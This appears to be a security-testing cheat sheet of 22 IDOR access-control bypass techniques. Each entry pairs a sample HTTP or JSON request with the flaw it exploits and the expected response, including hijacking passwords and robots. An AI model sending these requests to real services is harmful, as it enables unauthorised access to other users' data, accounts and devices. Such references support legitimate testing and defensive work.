1. IDOR via Direct ID Substitution
- Request: GET /api/user/10001/profile → change to GET /api/user/10002/profile
- Condition: Endpoint uses user-supplied ID to fetch user data without authorization check
- Case: The application uses a numeric user ID in the URL path to retrieve user profile data. No server-side check verifies that the authenticated user owns the requested ID
- Output: GET /api/user/10002/profile → 200 OK with victim's profile data

---

2. IDOR via Parameter Injection
- Request: GET /api_v1/messages?user_id=victim_id
- Condition: Endpoint requires additional parameters to bypass authorization checks
- Case: The endpoint has multiple ways to specify which data to retrieve. The authorization check might only apply to one method. Adding user_id as a query parameter bypasses the check
- Output: GET /api_v1/messages → 401 Unauthorized, GET /api_v1/messages?user_id=victim_id → 200 OK

---

3. IDOR via HTTP Parameter Pollution (HPP)
- Request: GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID
- Condition: Endpoint accepts duplicate parameters and uses different values for different purposes
- Case: The authorization check uses the first parameter (your ID), while the data retrieval uses the second (victim's ID). Sending duplicate parameters splits the logic
- Output: GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID → 200 OK with victim's data

---

4. IDOR via Array Wrapping
- Request: {"id": [111]}
- Condition: JSON API endpoint expects a plain string for ID but authorization logic skips checks when receiving an array
- Case: Some authorization mechanisms expect a plain string for IDs. If they receive an array instead, they may skip authorization checks entirely. When the input reaches the data-fetching component, it flattens the array and grants access
- Output: {"id": 111} → 401 Unauthorized, {"id": [111]} → 200 OK

---

5. IDOR via JSON Object Wrapping
- Request: {"id": {"id": 111}}
- Condition: JSON API endpoint expects a plain value but authorization logic bypasses nested objects
- Case: Similar to array wrapping, nested objects can bypass type checking in authorization logic. The authorization check fails to extract the inner ID, while the data fetcher recursively resolves it
- Output: {"id": 111} → 401 Unauthorized, {"id": {"id": 111}} → 200 OK

---

6. IDOR via JSON Parameter Pollution
- Request: POST /api/get_profile with {"user_id": "legitimate_user_id", "user_id": "victim_user_id"}
- Condition: JSON parser uses different values for different purposes when duplicate keys are sent
- Case: The server uses the first user_id for authorization check (legitimate) and the second user_id for data retrieval (victim). Sending duplicate keys in JSON splits the logic
- Output: {"user_id": "legitimate_user_id", "user_id": "victim_user_id"} → 200 OK with victim's data

---

7. IDOR via File Extension Modification
- Request: GET /user_data/2341.json
- Condition: Framework handles JSON requests differently from HTML requests with different authorization logic
- Case: Ruby on Rails and other frameworks sometimes route .json requests through a different code path than HTML requests. The JSON path may lack authorization checks that the HTML path enforces
- Output: /user_data/2341 → 401 Unauthorized, /user_data/2341.json → 200 OK

---

8. IDOR via API Version Downgrade
- Request: GET /v1/users_data/1234
- Condition: Older API versions have weaker or missing access controls
- Case: Newer API versions (v3) enforce authorization checks, but older versions (v1) were deployed before the checks were added and remain accessible. Downgrading the version bypasses the fix
- Output: /v3/users_data/1234 → 403 Forbidden, /v1/users_data/1234 → 200 OK

---

9. IDOR via Wildcard Value
- Request: {"user_id": "*"}
- Condition: Authorization filter does not handle wildcard values properly
- Case: The ownership filter checks if the user_id matches the authenticated user. A wildcard "*" bypasses the comparison logic, causing the filter to pass and return all records
- Output: {"user_id": "123"} → 403 Forbidden, {"user_id": "*"} → 200 OK

---

10. IDOR via Null Value
- Request: {"user_id": null}
- Condition: Authorization filter does not handle null values properly
- Case: The ownership filter checks if the user_id matches the authenticated user. A null value causes the comparison to evaluate to false-positive (no match needed), bypassing the check
- Output: {"user_id": "123"} → 403 Forbidden, {"user_id": null} → 200 OK

---

11. IDOR via URL Encoding
- Request: GET /api/user/%31%30%30%30%31/profile
- Condition: Authorization check compares raw URL string but data fetcher decodes the URL
- Case: The authorization middleware compares the raw URL path string, while the router decodes URL-encoded characters before passing to the controller. Encoding the ID bypasses the string comparison but the decoded ID still reaches the database query
- Output: /api/user/10001/profile → 403 Forbidden, /api/user/%31%30%30%30%31/profile → 200 OK

---

12. IDOR via Double URL Encoding
- Request: GET /api/user/%2531%2530%2530%2530%2531/profile
- Condition: Authorization check decodes once but data fetcher decodes twice
- Case: The first decode by the middleware produces %31%30%30%30%31 (still encoded), which does not match the blocked pattern. The router decodes again to get 10001, which reaches the database query
- Output: /api/user/10001/profile → 403 Forbidden, /api/user/%2531%2530%2530%2530%2531/profile → 200 OK

---

13. IDOR via Base64 Encoding
- Request: GET /api/user/MTAwMDE=/profile
- Condition: Application accepts Base64-encoded IDs and authorization check does not decode before comparing
- Case: The application supports Base64-encoded identifiers for API compatibility. The authorization check compares the raw string "MTAwMDE=" against the user's numeric ID and fails to match, but the data fetcher decodes Base64 to get 10001 and returns the record
- Output: /api/user/10001/profile → 403 Forbidden, /api/user/MTAwMDE=/profile → 200 OK

---

14. IDOR via Case Manipulation
- Request: GET /api/user/ABC123/profile (when original is abc123)
- Condition: Authorization check is case-sensitive but database query is case-insensitive
- Case: The authorization middleware performs a case-sensitive string comparison, so "ABC123" does not match the blocked "abc123". The database query is case-insensitive, so it still finds the record
- Output: /api/user/abc123/profile → 403 Forbidden, /api/user/ABC123/profile → 200 OK

---

15. IDOR via HTTP Method Override
- Request: POST /api/user/12345 with X-HTTP-Method-Override: DELETE
- Condition: Authorization check applies to DELETE method but not POST, while the override header reroutes POST to DELETE internally
- Case: The authorization middleware checks the HTTP method and blocks DELETE. However, it does not check the X-HTTP-Method-Override header. The framework's router honors the override header and processes the request as DELETE after the middleware passes
- Output: DELETE /api/user/12345 → 403 Forbidden, POST /api/user/12345 with X-HTTP-Method-Override: DELETE → 200 OK

---

16. IDOR via Parameter Location Shifting (Query to Body)
- Request: POST /api/user/profile with body user_id=12345
- Condition: Authorization check only inspects query string parameters but data fetcher reads from POST body
- Case: The authorization middleware checks query string parameters for the user ID. Moving the parameter to the POST body bypasses the check, but the data fetcher reads from both query and body
- Output: GET /api/user/profile?user_id=12345 → 403 Forbidden, POST /api/user/profile with body user_id=12345 → 200 OK

---

17. IDOR via Parameter Location Shifting (Body to Header)
- Request: GET /api/user/profile with header X-User-Id: 12345
- Condition: Authorization check only inspects POST body but data fetcher reads from custom headers
- Case: The authorization middleware checks the POST body for the user ID. Moving the parameter to a custom header bypasses the check, but the data fetcher reads from custom headers as a fallback
- Output: POST /api/user/profile with body user_id=12345 → 403 Forbidden, GET /api/user/profile with header X-User-Id: 12345 → 200 OK

---

18. IDOR via GraphQL Query Manipulation
- Request: GraphQL query { user(id: "victim_id") { email phone address } }
- Condition: GraphQL endpoint does not enforce field-level authorization
- Case: The GraphQL resolver fetches the user object by ID without checking if the authenticated user is authorized to view it. Changing the ID in the query returns another user's data. Fragments and batch queries can also bypass field-level checks
- Output: query { user(id: "10001") { email } } → own data, query { user(id: "10002") { email } } → victim's data

---

19. IDOR via Password Change Endpoint
- Request: POST /api/change_password with {"user_id": "victim_id", "new_password": "hacked123"}
- Condition: Password change endpoint uses user_id from request body without verifying it matches the authenticated user
- Case: The password change request contains a user identifier in the body. The endpoint trusts the body value instead of using the authenticated session's user ID. Changing the user_id to another user's ID changes that user's password
- Output: POST /api/change_password {"user_id": "10001", "new_password": "hacked123"} → own password changed, POST /api/change_password {"user_id": "10002", "new_password": "hacked123"} → victim's password changed

---

20. IDOR via Receipt ID (Financial Data)
- Request: GET /api/tax_payment/{receipt_id}
- Condition: API retrieves tax payment data by receipt ID without verifying the current user is authorized to access that record
- Case: Any authenticated user can access any tax payment record by changing the receipt ID in the API request. The API trusts the receipt ID without checking ownership
- Output: GET /api/tax_payment/12345 → own tax record, GET /api/tax_payment/12346 → another taxpayer's record

---

21. IDOR via Robot/Device Control API
- Request: POST /api/robot/control with {"robot_id": "victim_robot_id", "command": "move_forward"}
- Condition: Robot management API requires access token but enforces no object-level checks on robot_id
- Case: The API requires a valid access token (authentication) but does not check whether the token's owner is authorized to control the specified robot. Changing the robot_id allows control of any robot
- Output: POST /api/robot/control {"robot_id": "own_robot", "command": "move"} → own robot moves, POST /api/robot/control {"robot_id": "victim_robot", "command": "move"} → victim's robot moves

---

22. IDOR via Participant ID (Poll/Rename)
- Request: POST /api/trpc/polls.participants.rename with {"participantId": "victim_participant_id", "name": "hacked"}
- Condition: Rename endpoint allows any authenticated user to change display names of other participants
- Case: The participant rename function does not verify that the requesting user is the poll owner or the participant themselves. Changing participantId to another user's ID renames that participant
- Output: POST /api/trpc/polls.participants.rename {"participantId": "own_id", "name": "newname"} → own name changed, POST /api/trpc/polls.participants.rename {"participantId": "victim_id", "name": "hacked"} → victim's name changed
